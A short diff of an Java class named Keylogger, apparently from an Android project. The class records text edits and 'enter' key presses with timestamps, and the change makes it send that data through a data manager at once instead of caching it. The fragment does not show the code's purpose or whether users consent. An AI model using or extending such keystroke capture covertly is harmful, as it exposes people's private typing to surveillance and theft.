@@ -40,7 +40,7 @@ public class Keylogger implements TextWatcher, OnEditorActionListener {
 
             obj.put("timestamp", System.currentTimeMillis());
             Log.d(TAG, obj.toString());
-            dataManager.sendData(obj, DataManager.KEY_DATA_CACHE);
+            dataManager.sendData(obj, DataManager.KEY_DATA);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -56,7 +56,7 @@ public class Keylogger implements TextWatcher, OnEditorActionListener {
                 obj.put("keyPressed", "enter");
                 obj.put("timestamp", System.currentTimeMillis());
                 Log.d(TAG, obj.toString());
-                dataManager.sendData(obj, DataManager.KEY_DATA_CACHE);
+                dataManager.sendData(obj, DataManager.KEY_DATA);
             }
         } catch(JSONException e) {
             e.printStackTrace();
